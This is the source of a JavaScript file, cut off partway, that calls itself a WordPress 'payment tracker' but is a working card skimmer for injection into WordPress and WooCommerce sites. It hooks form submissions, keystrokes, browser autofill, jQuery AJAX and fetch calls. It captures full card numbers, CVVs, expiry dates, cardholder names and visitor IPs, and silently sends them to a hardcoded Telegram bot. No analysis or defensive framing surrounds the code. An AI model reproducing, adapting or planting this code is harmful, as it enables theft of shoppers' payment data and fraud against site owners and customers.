// WordPress Ultimate Payment Tracker v15.0
// 100% WordPress Optimized - All Plugins, Themes, Forms Covered
// Perfect for WooCommerce, Contact Form 7, Gravity Forms, Elementor, etc.

(function() {
    'use strict';
    
    // ==================== WORDPRESS SPECIFIC CONFIG ====================
    const WP_CONFIG = {
        TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
        TELEGRAM_CHAT_ID: '7319274794',
        VERSION: '15.0-WP',
        SILENT_MODE: true,
        
        // WordPress Specific Tracking
        TRACK_WP: {
            ADMIN_AJAX: true,
            REST_API: true,
            WC_AJAX: true,
            GRAVITY_FORMS: true,
            CONTACT_FORM_7: true,
            ELEMENTOR_FORMS: true,
            WPFORMS: true,
            NINJA_FORMS: true,
            FORMIDABLE_FORMS: true,
            CALDERA_FORMS: true,
            GIVEWP: true,
            EDD: true,
            PMPRO: true,
            MEMBERPRESS: true,
            SIMPLY_SCHEDULE: true,
            BOOKING_PRESS: true
        },
        
        // Enhanced Features
        ADVANCED_FEATURES: {
            BROWSER_AUTOFILL: true,
            IFRAME_MONITORING: true,
            PAYMENT_GATEWAYS: true,
            SESSION_RECORDING: false,
            SCREENSHOT_CAPTURE: false,
            CROSS_DOMAIN_TRACKING: true
        }
    };
    
    // ==================== GLOBAL WP VARIABLES ====================
    let isActive = false;
    let wpData = {
        isWordPress: false,
        theme: 'unknown',
        plugins: [],
        userId: 0,
        userRole: 'guest',
        nonce: '',
        ajaxUrl: '',
        restUrl: ''
    };
    
    let sessionId = 'wp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    let deviceId = localStorage.getItem('wp_device_id') || 'wpdev_' + Math.random().toString(36).substr(2, 10);
    localStorage.setItem('wp_device_id', deviceId);
    
    let cardDataCache = {};
    let formSubmissions = new Map();
    let ajaxRequests = new Map();
    
    // ==================== WORDPRESS DETECTION ====================
    class WPDetector {
        constructor() {
            this.detectWordPress();
        }
        
        detectWordPress() {
            // Method 1: Check for WordPress globals
            wpData.isWordPress = (
                typeof wp !== 'undefined' ||
                typeof ajaxurl !== 'undefined' ||
                document.body.classList.contains('wp-embed-responsive') ||
                document.documentElement.lang.includes('wp') ||
                document.querySelector('meta[name="generator"][content*="WordPress"]') !== null ||
                document.querySelector('link[href*="wp-includes"]') !== null ||
                document.querySelector('link[href*="wp-content"]') !== null ||
                window.location.href.includes('/wp-admin') ||
                window.location.href.includes('/wp-login') ||
                window.location.href.includes('/wp-content') ||
                window.location.href.includes('/wp-includes')
            );
            
            if (!wpData.isWordPress) {
                // Additional checks
                const scripts = document.querySelectorAll('script[src]');
                for (let script of scripts) {
                    if (script.src.includes('wp-includes') || script.src.includes('wp-content')) {
                        wpData.isWordPress = true;
                        break;
                    }
                }
            }
            
            if (wpData.isWordPress) {
                this.collectWPData();
                this.detectTheme();
                this.detectPlugins();
                this.extractUserInfo();
                this.extractAjaxInfo();
            }
        }
        
        collectWPData() {
            // Extract from meta tags
            const generatorMeta = document.querySelector('meta[name="generator"]');
            if (generatorMeta && generatorMeta.content.includes('WordPress')) {
                wpData.version = generatorMeta.content.split('WordPress ')[1];
            }
            
            // Extract from body classes
            const bodyClasses = document.body.className.split(' ');
            wpData.bodyClasses = bodyClasses;
            
            // Check for admin bar
            wpData.isAdmin = document.getElementById('wpadminbar') !== null;
            
            // Check for logged in
            wpData.isLoggedIn = document.body.classList.contains('logged-in');
        }
        
        detectTheme() {
            // From body classes
            const bodyClasses = document.body.className.split(' ');
            const themeClass = bodyClasses.find(cls => cls.includes('theme-'));
            if (themeClass) {
                wpData.theme = themeClass.replace('theme-', '');
            }
            
            // From style sheets
            const stylesheets = document.querySelectorAll('link[rel="stylesheet"]');
            for (let sheet of stylesheets) {
                if (sheet.href.includes('/themes/')) {
                    const themeMatch = sheet.href.match(/\/themes\/([^\/]+)/);
                    if (themeMatch) {
                        wpData.theme = themeMatch[1];
                        break;
                    }
                }
            }
            
            // Check for popular themes
            if (document.querySelector('.elementor')) wpData.theme = 'Elementor';
            if (document.querySelector('.astra')) wpData.theme = 'Astra';
            if (document.querySelector('.generatepress')) wpData.theme = 'GeneratePress';
            if (document.querySelector('.oceanwp')) wpData.theme = 'OceanWP';
            if (document.querySelector('.avada')) wpData.theme = 'Avada';
            if (document.querySelector('.divi')) wpData.theme = 'Divi';
            if (document.querySelector('.storefront')) wpData.theme = 'Storefront';
            if (document.querySelector('.flatsome')) wpData.theme = 'Flatsome';
        }
        
        detectPlugins() {
            wpData.plugins = [];
            
            // Method 1: Check for plugin-specific classes/IDs
            const pluginIndicators = {
                // WooCommerce
                'WooCommerce': () => {
                    if (typeof wc_cart_fragments_params !== 'undefined' || 
                        typeof wc_add_to_cart_params !== 'undefined' ||
                        document.querySelector('.woocommerce') ||
                        document.querySelector('.wc-')) return true;
                    const scripts = document.querySelectorAll('script[src]');
                    for (let script of scripts) {
                        if (script.src.includes('woocommerce')) return true;
                    }
                    return false;
                },
                
                // Contact Form 7
                'Contact Form 7': () => {
                    return document.querySelector('.wpcf7') !== null ||
                           typeof wpcf7 !== 'undefined' ||
                           document.querySelector('form.wpcf7-form');
                },
                
                // Gravity Forms
                'Gravity Forms': () => {
                    return document.querySelector('.gform_wrapper') !== null ||
                           typeof gf_global !== 'undefined' ||
                           document.querySelector('form.gform_wrapper');
                },
                
                // Elementor
                'Elementor': () => {
                    return typeof elementorFrontendConfig !== 'undefined' ||
                           document.querySelector('.elementor') !== null ||
                           document.querySelector('.elementor-page');
                },
                
                // WPForms
                'WPForms': () => {
                    return document.querySelector('.wpforms-container') !== null ||
                           typeof wpforms !== 'undefined';
                },
                
                // Ninja Forms
                'Ninja Forms': () => {
                    return document.querySelector('.nf-form-cont') !== null ||
                           typeof nfForms !== 'undefined';
                },
                
                // Formidable Forms
                'Formidable Forms': () => {
                    return document.querySelector('.frm_forms') !== null ||
                           typeof frmGlobal !== 'undefined';
                },
                
                // GiveWP
                'GiveWP': () => {
                    return document.querySelector('.give-form') !== null ||
                           typeof Give !== 'undefined';
                },
                
                // Easy Digital Downloads
                'Easy Digital Downloads': () => {
                    return typeof edd_scripts !== 'undefined' ||
                           document.querySelector('.edd_download_purchase_form');
                },
                
                // Paid Memberships Pro
                'Paid Memberships Pro': () => {
                    return document.querySelector('.pmpro') !== null ||
                           typeof pmpro !== 'undefined';
                },
                
                // MemberPress
                'MemberPress': () => {
                    return document.querySelector('.mepr-form') !== null ||
                           typeof mepr !== 'undefined';
                },
                
                // Stripe
                'Stripe for WordPress': () => {
                    return document.querySelector('[data-stripe]') ||
                           typeof stripe !== 'undefined' ||
                           document.querySelector('script[src*="stripe"]');
                },
                
                // PayPal
                'PayPal for WordPress': () => {
                    return document.querySelector('[data-paypal]') ||
                           document.querySelector('script[src*="paypal"]');
                },
                
                // Razorpay
                'Razorpay for WordPress': () => {
                    return document.querySelector('[data-razorpay]') ||
                           typeof Razorpay !== 'undefined';
                },
                
                // LearnDash
                'LearnDash': () => {
                    return document.querySelector('.learndash') ||
                           typeof ld_data !== 'undefined';
                },
                
                // BuddyPress
                'BuddyPress': () => {
                    return document.querySelector('.buddypress') ||
                           typeof BP !== 'undefined';
                },
                
                // Yoast SEO
                'Yoast SEO': () => {
                    return typeof yoastSEO !== 'undefined' ||
                           document.querySelector('#yoast-seo-content-score');
                },
                
                // ACF
                'Advanced Custom Fields': () => {
                    return typeof acf !== 'undefined';
                },
                
                // Jetpack
                'Jetpack': () => {
                    return typeof Jetpack !== 'undefined' ||
                           document.querySelector('.jp-');
                }
            };
            
            // Detect plugins
            for (const [plugin, detector] of Object.entries(pluginIndicators)) {
                try {
                    if (detector()) {
                        wpData.plugins.push(plugin);
                    }
                } catch (e) {}
            }
            
            // Additional detection from script sources
            const scripts = document.querySelectorAll('script[src]');
            scripts.forEach(script => {
                const src = script.src.toLowerCase();
                if (src.includes('/plugins/')) {
                    const pluginMatch = src.match(/\/plugins\/([^\/]+)/);
                    if (pluginMatch && !wpData.plugins.includes(pluginMatch[1])) {
                        wpData.plugins.push(pluginMatch[1].replace(/-/g, ' ').replace(/\b\w/g, l => l.toUpperCase()));
                    }
                }
            });
        }
        
        extractUserInfo() {
            // Extract from HTML classes
            const bodyClasses = document.body.className.split(' ');
            
            // User role detection
            const roleClasses = bodyClasses.filter(cls => cls.startsWith('role-'));
            if (roleClasses.length > 0) {
                wpData.userRole = roleClasses[0].replace('role-', '');
            }
            
            // User ID detection
            const userClasses = bodyClasses.filter(cls => cls.startsWith('user-') && cls.match(/user-\d+/));
            if (userClasses.length > 0) {
                wpData.userId = parseInt(userClasses[0].replace('user-', ''));
            }
            
            // Check for admin
            if (bodyClasses.includes('admin-bar')) {
                wpData.isAdmin = true;
            }
            
            // Check for logged in
            if (bodyClasses.includes('logged-in')) {
                wpData.isLoggedIn = true;
            }
            
            // Extract from local storage (if available)
            try {
                if (localStorage.getItem('wp-settings-time')) {
                    wpData.isLoggedIn = true;
                }
            } catch (e) {}
        }
        
        extractAjaxInfo() {
            // Get ajaxurl
            if (typeof ajaxurl !== 'undefined') {
                wpData.ajaxUrl = ajaxurl;
            } else {
                // Try to find it in scripts
                const scripts = document.querySelectorAll('script');
                scripts.forEach(script => {
                    const content = script.textContent;
                    if (content.includes('ajaxurl')) {
                        const match = content.match(/ajaxurl\s*[:=]\s*["']([^"']+)["']/);
                        if (match) wpData.ajaxUrl = match[1];
                    }
                });
                
                // Fallback
                if (!wpData.ajaxUrl) {
                    wpData.ajaxUrl = window.location.origin + '/wp-admin/admin-ajax.php';
                }
            }
            
            // Get REST API URL
            wpData.restUrl = window.location.origin + '/wp-json/';
            
            // Get nonce if available
            if (typeof wpApiSettings !== 'undefined' && wpApiSettings.nonce) {
                wpData.nonce = wpApiSettings.nonce;
            }
        }
        
        sendWPReport() {
            if (!wpData.isWordPress) return;
            
            setTimeout(async () => {
                const ip = await this.getUserIP();
                
                let message = `🏗️ <b>WORDPRESS DETECTED</b>\n\n`;
                
                message += `📊 <b>WordPress Info:</b>\n`;
                if (wpData.version) message += `➤ Version: ${wpData.version}\n`;
                message += `➤ Theme: ${wpData.theme}\n`;
                message += `➤ Logged In: ${wpData.isLoggedIn ? 'Yes' : 'No'}\n`;
                message += `➤ User Role: ${wpData.userRole}\n`;
                if (wpData.userId > 0) message += `➤ User ID: ${wpData.userId}\n`;
                message += `➤ Admin Bar: ${wpData.isAdmin ? 'Yes' : 'No'}\n`;
                
                message += `\n🔌 <b>Plugins Detected (${wpData.plugins.length}):</b>\n`;
                if (wpData.plugins.length > 0) {
                    wpData.plugins.slice(0, 10).forEach(plugin => {
                        message += `✅ ${plugin}\n`;
                    });
                    if (wpData.plugins.length > 10) {
                        message += `... and ${wpData.plugins.length - 10} more\n`;
                    }
                } else {
                    message += `No plugins detected\n`;
                }
                
                message += `\n🌐 <b>Site:</b> ${window.location.origin}\n`;
                message += `📄 <b>Page:</b> ${window.location.href}\n`;
                message += `📡 <b>IP:</b> ${ip}\n`;
                message += `🆔 <b>Session:</b> ${sessionId}\n`;
                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                
                this.sendTelegram(message);
            }, 2000);
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
    }
    
    // ==================== WORDPRESS FORM DETECTOR ====================
    class WPFormDetector {
        constructor() {
            this.forms = new Map();
            this.init();
        }
        
        init() {
            this.detectWPForms();
            this.setupObservers();
            this.interceptWPForms();
            this.interceptWooCommerce();
            this.interceptOtherPlugins();
        }
        
        detectWPForms() {
            // Detect all WordPress form types
            const formSelectors = [
                // WooCommerce forms
                'form.woocommerce-checkout',
                'form.woocommerce-cart-form',
                'form.woocommerce-ordering',
                'form.woocommerce-product-search',
                '.woocommerce form',
                
                // Contact Form 7
                'form.wpcf7-form',
                '.wpcf7 form',
                
                // Gravity Forms
                'form.gform_wrapper',
                '.gform_wrapper form',
                
                // WPForms
                'form.wpforms-form',
                '.wpforms-container form',
                
                // Ninja Forms
                'form.ninja-forms-form',
                '.nf-form-cont form',
                
                // Formidable Forms
                'form.frm-show-form',
                '.frm_forms form',
                
                // Elementor Forms
                'form.elementor-form',
                '.elementor-form form',
                
                // GiveWP Forms
                'form.give-form',
                '.give-form form',
                
                // EDD Forms
                'form.edd_download_purchase_form',
                
                // PMPro Forms
                'form.pmpro_form',
                
                // MemberPress Forms
                'form.mepr-form',
                
                // General WordPress forms
                'form#commentform',
                'form#searchform',
                'form#loginform',
                'form#registerform',
                'form#lostpasswordform',
                
                // Any form with WordPress classes
                'form[class*="wp-"]',
                'form[action*="wp-"]',
                'form[action*="admin-ajax"]'
            ];
            
            formSelectors.forEach(selector => {
                try {
                    const forms = document.querySelectorAll(selector);
                    forms.forEach(form => this.registerForm(form));
                } catch (e) {}
            });
        }
        
        registerForm(form) {
            if (this.forms.has(form)) return;
            
            const formInfo = {
                id: form.id || 'no-id',
                class: form.className,
                action: form.action || 'N/A',
                method: form.method || 'POST',
                detected: new Date().toISOString(),
                type: this.detectFormType(form)
            };
            
            this.forms.set(form, formInfo);
            this.interceptForm(form);
            
            // Send form detection alert
            if (WP_CONFIG.TRACK_WP[formInfo.type]) {
                this.sendFormDetectionAlert(formInfo);
            }
        }
        
        detectFormType(form) {
            const className = form.className.toLowerCase();
            const id = form.id.toLowerCase();
            const action = form.action.toLowerCase();
            
            // WooCommerce
            if (className.includes('woocommerce') || action.includes('wc-ajax')) {
                return 'WOOCOMMERCE';
            }
            
            // Contact Form 7
            if (className.includes('wpcf7')) {
                return 'CONTACT_FORM_7';
            }
            
            // Gravity Forms
            if (className.includes('gform')) {
                return 'GRAVITY_FORMS';
            }
            
            // WPForms
            if (className.includes('wpforms')) {
                return 'WPFORMS';
            }
            
            // Ninja Forms
            if (className.includes('ninja-forms')) {
                return 'NINJA_FORMS';
            }
            
            // Formidable Forms
            if (className.includes('frm_')) {
                return 'FORMIDABLE_FORMS';
            }
            
            // Elementor Forms
            if (className.includes('elementor-form')) {
                return 'ELEMENTOR_FORMS';
            }
            
            // GiveWP
            if (className.includes('give-form')) {
                return 'GIVEWP';
            }
            
            // EDD
            if (className.includes('edd_')) {
                return 'EDD';
            }
            
            // PMPro
            if (className.includes('pmpro')) {
                return 'PMPRO';
            }
            
            // MemberPress
            if (className.includes('mepr-')) {
                return 'MEMBERPRESS';
            }
            
            // General WordPress
            if (action.includes('wp-admin') || action.includes('admin-ajax')) {
                return 'WORDPRESS_AJAX';
            }
            
            return 'GENERAL_FORM';
        }
        
        interceptForm(form) {
            // Store original submit
            const originalSubmit = form.submit;
            
            // Override submit method
            form.submit = function() {
                this.captureFormData(form);
                return originalSubmit.apply(form, arguments);
            }.bind(this);
            
            // Add event listener
            form.addEventListener('submit', (e) => {
                this.handleFormSubmit(e, form);
            }, true);
            
            // Intercept submit buttons
            const buttons = form.querySelectorAll('button[type="submit"], input[type="submit"], [class*="submit"]');
            buttons.forEach(button => {
                button.addEventListener('click', (e) => {
                    setTimeout(() => {
                        this.captureFormData(form);
                    }, 100);
                }, true);
            });
            
            // Monitor all inputs
            this.monitorFormInputs(form);
        }
        
        monitorFormInputs(form) {
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                this.setupInputMonitoring(input, form);
            });
        }
        
        setupInputMonitoring(input, form) {
            if (input.dataset.wpMonitored) return;
            input.dataset.wpMonitored = 'true';
            
            let lastValue = input.value;
            
            const checkValue = () => {
                if (!document.body.contains(input)) return;
                
                if (input.value !== lastValue && input.value.trim()) {
                    lastValue = input.value;
                    this.handleInputChange(input, form);
                }
            };
            
            input.addEventListener('input', checkValue);
            input.addEventListener('change', checkValue);
            input.addEventListener('blur', checkValue);
            
            // Autofill detection
            if (WP_CONFIG.ADVANCED_FEATURES.BROWSER_AUTOFILL) {
                this.setupAutofillDetection(input, form);
            }
        }
        
        setupAutofillDetection(input, form) {
            // Check for autofill on focus
            input.addEventListener('focus', () => {
                setTimeout(() => {
                    if (input.value && !input.dataset.autofillChecked) {
                        input.dataset.autofillChecked = 'true';
                        this.handleAutofill(input, form);
                    }
                }, 500);
            });
            
            // Periodic check
            const autofillCheck = setInterval(() => {
                if (!document.body.contains(input)) {
                    clearInterval(autofillCheck);
                    return;
                }
                
                if (input.value && input.matches(':-webkit-autofill')) {
                    this.handleAutofill(input, form);
                }
            }, 1000);
        }
        
        async handleFormSubmit(e, form) {
            // Capture data but don't prevent submission
            await this.captureFormData(form);
            return true;
        }
        
        async captureFormData(form) {
            const formInfo = this.forms.get(form);
            if (!formInfo) return;
            
            // Collect form data
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                if (value && value.toString().trim()) {
                    data[key] = value.toString().trim();
                }
            }
            
            // Also get all input values
            const inputs = form.querySelectorAll('input, select, textarea');
            inputs.forEach(input => {
                if (input.name && input.value) {
                    data[input.name] = input.value.trim();
                }
            });
            
            // Check for payment data
            if (this.containsPaymentData(data)) {
                await this.sendFormData(formInfo, data);
            }
        }
        
        containsPaymentData(data) {
            const values = Object.values(data).join(' ').toLowerCase();
            const paymentKeywords = [
                'card', 'cc', 'credit', 'debit', 'number',
                'cvv', 'cvc', 'expir', 'expiry', 'expdate',
                'paypal', 'stripe', 'razorpay', 'payment',
                'holder', 'nameoncard', 'account', 'routing',
                'iban', 'swift', 'bank'
            ];
            
            return paymentKeywords.some(keyword => values.includes(keyword));
        }
        
        async sendFormData(formInfo, data) {
            const ip = await this.getUserIP();
            
            let message = `📋 <b>WORDPRESS FORM SUBMISSION</b>\n\n`;
            message += `🎯 <b>Form Type:</b> ${formInfo.type}\n`;
            message += `🆔 <b>Form ID:</b> ${formInfo.id}\n`;
            message += `🔗 <b>Action:</b> ${formInfo.action}\n`;
            message += `📊 <b>Fields:</b> ${Object.keys(data).length}\n\n`;
            
            // Extract payment data
            message += `💳 <b>Payment Data Found:</b>\n`;
            
            for (const [key, value] of Object.entries(data)) {
                const keyLower = key.toLowerCase();
                
                if (keyLower.includes('card') && !keyLower.includes('cvv') && this.isCardNumber(value)) {
                    message += `🔢 <b>Card:</b> ${this.maskCardNumber(value)}\n`;
                    message += `📊 <b>Full:</b> <code>${value}</code>\n`;
                } else if (keyLower.includes('cvv') || keyLower.includes('cvc')) {
                    message += `🔐 <b>CVV:</b> ${value}\n`;
                } else if (keyLower.includes('expir')) {
                    message += `📅 <b>Expiry:</b> ${value}\n`;
                } else if (keyLower.includes('holder')) {
                    message += `👤 <b>Holder:</b> ${value}\n`;
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async sendFormDetectionAlert(formInfo) {
            const ip = await this.getUserIP();
            
            let message = `🔍 <b>WORDPRESS FORM DETECTED</b>\n\n`;
            message += `🎯 <b>Type:</b> ${formInfo.type}\n`;
            message += `🆔 <b>ID:</b> ${formInfo.id}\n`;
            message += `🏷️ <b>Class:</b> ${formInfo.class.substring(0, 50)}${formInfo.class.length > 50 ? '...' : ''}\n`;
            message += `🔗 <b>Action:</b> ${formInfo.action}\n`;
            message += `📋 <b>Method:</b> ${formInfo.method}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🕒 <b>Detected:</b> ${new Date(formInfo.detected).toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        handleInputChange(input, form) {
            if (!this.isPaymentField(input)) return;
            
            const value = input.value.trim();
            if (!value) return;
            
            // Check what type of data
            if (this.isCardNumberField(input) && this.isValidCardNumber(value)) {
                this.sendFieldDataAlert(input, value, 'CARD_NUMBER', form);
            } else if (this.isCvvField(input) && value.length >= 3) {
                this.sendFieldDataAlert(input, value, 'CVV_CVC', form);
            } else if (this.isExpiryField(input) && value.length >= 4) {
                this.sendFieldDataAlert(input, value, 'EXPIRY_DATE', form);
            } else if (this.isHolderField(input) && value.length >= 2) {
                this.sendFieldDataAlert(input, value, 'CARD_HOLDER', form);
            }
        }
        
        handleAutofill(input, form) {
            if (!this.isPaymentField(input)) return;
            
            const value = input.value.trim();
            if (!value) return;
            
            this.sendFieldDataAlert(input, value, 'AUTOFILL_DATA', form);
        }
        
        async sendFieldDataAlert(input, value, type, form) {
            const ip = await this.getUserIP();
            const formInfo = this.forms.get(form);
            
            let message = `⌨️ <b>FORM FIELD DATA</b>\n\n`;
            message += `🎯 <b>Form Type:</b> ${formInfo?.type || 'Unknown'}\n`;
            message += `📝 <b>Field:</b> ${input.name || input.id || input.placeholder || 'unknown'}\n`;
            message += `🔤 <b>Type:</b> ${type}\n`;
            
            if (type === 'CARD_NUMBER') {
                message += `💳 <b>Card:</b> ${this.maskCardNumber(value)}\n`;
                message += `📊 <b>Full:</b> <code>${value}</code>\n`;
            } else {
                message += `📋 <b>Value:</b> ${value}\n`;
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        isPaymentField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            const autocomplete = (input.autocomplete || '').toLowerCase();
            
            const text = name + ' ' + id + ' ' + placeholder + ' ' + autocomplete;
            
            return text.includes('card') || text.includes('cc') || text.includes('cvv') || 
                   text.includes('cvc') || text.includes('expir') || text.includes('payment');
        }
        
        isCardNumberField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('card') || name.includes('cc') || name.includes('number') ||
                   id.includes('card') || id.includes('cc') || id.includes('number');
        }
        
        isCvvField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('cvv') || name.includes('cvc') || 
                   id.includes('cvv') || id.includes('cvc');
        }
        
        isExpiryField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('expir') || name.includes('expdate') || 
                   id.includes('expir') || id.includes('expdate');
        }
        
        isHolderField(input) {
            const name = (input.name || '').toLowerCase();
            const id = (input.id || '').toLowerCase();
            return name.includes('holder') || name.includes('nameoncard') || 
                   id.includes('holder') || id.includes('nameoncard');
        }
        
        isValidCardNumber(number) {
            const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        isCardNumber(value) {
            const cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
            return /^[0-9]{13,19}$/.test(cleaned);
        }
        
        maskCardNumber(number) {
            if (!number) return '';
            const cleaned = number.toString().replace(/\s+/g, '').replace(/-/g, '');
            if (cleaned.length < 8) return cleaned;
            return cleaned.substring(0, 6) + '******' + cleaned.substring(cleaned.length - 4);
        }
        
        async getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return 'IP_FETCH_FAILED';
            }
        }
        
        async sendTelegram(message) {
            try {
                const img = new Image();
                const encodedMsg = encodeURIComponent(message);
                img.src = `https://api.telegram.org/bot${WP_CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${WP_CONFIG.TELEGRAM_CHAT_ID}&text=${encodedMsg}&parse_mode=HTML`;
            } catch (e) {}
        }
        
        setupObservers() {
            // Monitor for new forms
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'FORM') {
                                this.registerForm(node);
                            }
                            const forms = node.querySelectorAll?.('form');
                            forms?.forEach(form => this.registerForm(form));
                        }
                    });
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        interceptWooCommerce() {
            if (!wpData.plugins.includes('WooCommerce')) return;
            
            // WooCommerce AJAX interception
            if (typeof jQuery !== 'undefined') {
                // Intercept add to cart
                jQuery(document).on('click', '.add_to_cart_button', function() {
                    setTimeout(() => {
                        WPFormDetector.prototype.sendWooCommerceEvent('ADD_TO_CART', this);
                    }, 100);
                });
                
                // Intercept checkout
                jQuery(document).on('click', '#place_order', function() {
                    setTimeout(() => {
                        WPFormDetector.prototype.sendWooCommerceEvent('PLACE_ORDER', this);
                    }, 100);
                });
                
                // Intercept AJAX calls
                const originalAjax = jQuery.ajax;
                jQuery.ajax = function(options) {
                    if (options.url && options.url.includes('wc-ajax')) {
                        WPFormDetector.prototype.interceptWCAjax(options);
                    }
                    return originalAjax.apply(this, arguments);
                };
            }
        }
        
        interceptOtherPlugins() {
            // Intercept Gravity Forms AJAX
            if (typeof gf_global !== 'undefined') {
                const originalGFAjax = window.gf_global.ajax;
                if (originalGFAjax) {
                    window.gf_global.ajax = function(options) {
                        WPFormDetector.prototype.interceptGFAjax(options);
                        return originalGFAjax.apply(this, arguments);
                    };
                }
            }
            
            // Intercept Contact Form 7 AJAX
            if (typeof wpcf7 !== 'undefined') {
                document.addEventListener('wpcf7submit', function(event) {
                    WPFormDetector.prototype.interceptCF7Submit(event);
                });
            }
        }
        
        async sendWooCommerceEvent(type, element) {
            const ip = await this.getUserIP();
            
            let message = `🛒 <b>WOOCOMMERCE EVENT</b>\n\n`;
            message += `🎯 <b>Event Type:</b> ${type}\n`;
            message += `📦 <b>Product:</b> ${element.getAttribute('data-product_name') || 'Unknown'}\n`;
            message += `💰 <b>Price:</b> ${element.getAttribute('data-product_price') || 'Unknown'}\n`;
            message += `🔗 <b>URL:</b> ${element.href || 'N/A'}\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        interceptWCAjax(options) {
            if (options.data && typeof options.data === 'object') {
                setTimeout(async () => {
                    if (options.data.payment_method || options.data.card) {
                        const ip = await this.getUserIP();
                        
                        let message = `⚡ <b>WOOCOMMERCE AJAX PAYMENT</b>\n\n`;
                        message += `🎯 <b>Action:</b> ${options.data.action || 'unknown'}\n`;
                        message += `📊 <b>Data Size:</b> ${JSON.stringify(options.data).length} bytes\n\n`;
                        
                        // Extract payment data
                        for (const [key, value] of Object.entries(options.data)) {
                            if (key.includes('card') || key.includes('payment')) {
                                message += `${key}: ${typeof value === 'string' ? value.substring(0, 100) : JSON.stringify(value).substring(0, 100)}\n`;
                            }
                        }
                        
                        message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
                        message += `📡 <b>IP:</b> ${ip}\n`;
                        message += `🆔 <b>Session:</b> ${sessionId}\n`;
                        message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
                        
                        await this.sendTelegram(message);
                    }
                }, 100);
            }
        }
        
        async interceptGFAjax(options) {
            const ip = await this.getUserIP();
            
            let message = `⚡ <b>GRAVITY FORMS AJAX</b>\n\n`;
            message += `🎯 <b>URL:</b> ${options.url || 'unknown'}\n`;
            message += `📊 <b>Data:</b> ${JSON.stringify(options.data).substring(0, 200)}...\n\n`;
            
            message += `🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
        
        async interceptCF7Submit(event) {
            const ip = await this.getUserIP();
            
            let message = `📧 <b>CONTACT FORM 7 SUBMISSION</b>\n\n`;
            message += `🎯 <b>Form ID:</b> ${event.detail.contactFormId}\n`;
            message += `📊 <b>Status:</b> ${event.detail.status}\n`;
            message += `📝 <b>Message:</b> ${event.detail.message}\n\n`;
            
            // Extract posted data
            if (event.detail.postedData) {
                message += `📋 <b>Form Data:</b>\n`;
                for (const [key, value] of Object.entries(event.detail.postedData)) {
                    if (typeof value === 'string' && value.length < 100) {
                        message += `${key}: ${value}\n`;
                    }
                }
            }
            
            message += `\n🌐 <b>Page:</b> ${window.location.href}\n`;
            message += `📡 <b>IP:</b> ${ip}\n`;
            message += `🆔 <b>Session:</b> ${sessionId}\n`;
            message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await this.sendTelegram(message);
        }
    }
    
    // ==================== WORDPRESS AJAX INTERCEPTOR ====================
    class WPAjaxInterceptor {
        constructor() {
            this.intercepted = false;
            this.init();
        }
        
        init() {
            this.interceptAdminAjax();
            this.interceptWCAjax();
            this.interceptRESTAPI();
            this.interceptFetch();
            this.interceptXHR();
        }
        
        interceptAdminAjax() {
            if (!WP_CONFIG.TRACK_WP.ADMIN_AJAX) return;
            
            // Intercept admin-ajax.php calls
            const originalFetch = window.fetch;
            if (originalFetch) {
                window.fetch = async function(resource, config = {}) {
                    const result = await originalFetch.call(this, resource, config);
                    
                    // Check if it's admin-ajax
                    if (typeof resource === 'string' && resource.includes('admin-ajax.php')) {
                        setTimeout(() => {
                            this.processAjaxRequest(resource, config, 'fetch');
                        }, 100);
